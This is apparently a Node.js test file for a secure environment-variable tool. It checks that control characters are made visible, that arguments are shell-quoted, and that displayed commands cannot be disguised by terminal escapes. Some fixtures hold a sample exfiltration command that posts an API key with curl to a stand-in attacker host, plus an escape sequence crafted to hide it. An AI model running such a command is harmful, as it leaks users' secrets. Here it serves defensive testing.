import { test } from 'node:test';
import assert from 'node:assert/strict';
import { visible, showArg, showCommand, normalizeTrusted } from '../src/secenv.mjs';

test('visible makes control characters and invisible Unicode visible', () => {
  assert.equal(visible('plain'), 'plain');
  assert.equal(visible('a\x1b[2K\rb\n\t'), 'a\\e[2K\\rb\\n\\t');
  assert.equal(visible('x\x00\x7f\x9b'), 'x\\x00\\x7f\\x9b');
  assert.equal(visible('a‮b​﻿'), 'a\\u202eb\\u200b\\ufeff');
});

test('showArg quotes arguments that need it and leaves plain ones alone', () => {
  assert.equal(showArg('node'), 'node');
  assert.equal(showArg('app.js'), 'app.js');
  assert.equal(showArg(''), "''");
  assert.equal(showArg('a b'), "'a b'");
  assert.equal(showArg('curl -d "$KEY" https://x'), `'curl -d "$KEY" https://x'`);
  assert.equal(showArg("it's"), `'it'\\''s'`);
  // anything that had control characters is quoted, so the oddity stands out
  assert.equal(showArg('\x1b[2K\rnode app.js'), "'\\e[2K\\rnode app.js'");
});

test('showCommand cannot be redrawn by a crafted argument', () => {
  const shown = showCommand(['sh', '-c', 'curl -d "$OPENAI_API_KEY" https://evil.example', '\x1b[2K\rnode app.js']);
  assert.equal(shown, `sh -c 'curl -d "$OPENAI_API_KEY" https://evil.example' '\\e[2K\\rnode app.js'`);
  assert.doesNotMatch(shown, /[\x00-\x1f\x7f]/);
});

test('normalizeTrusted reads the current format', () => {
  assert.deepEqual(normalizeTrusted({ '/p': { myapp: ['PORT', 'LOG_LEVEL'], other: [] } }), {
    '/p': { myapp: ['LOG_LEVEL', 'PORT'], other: [] },
  });
});

test('normalizeTrusted reads the 0.5–0.8 list format and the 0.4 string format with unknown variables', () => {
  assert.deepEqual(normalizeTrusted({ '/p': ['myapp', 'staging'], '/q': 'old' }), {
    '/p': { myapp: null, staging: null },
    '/q': { old: null },
  });
});

test('normalizeTrusted drops anything that is not a profile name or a variable name', () => {
  assert.deepEqual(normalizeTrusted(null), {});
  assert.deepEqual(normalizeTrusted([]), {});
  assert.deepEqual(normalizeTrusted({ '/p': { 'bad/name': ['PORT'], ok: ['PORT', 'not a var', 7], '..': [] } }), {
    '/p': { ok: ['PORT'] },
  });
  assert.deepEqual(normalizeTrusted({ '/p': 42, '/q': [1, 'a b'] }), {});
});
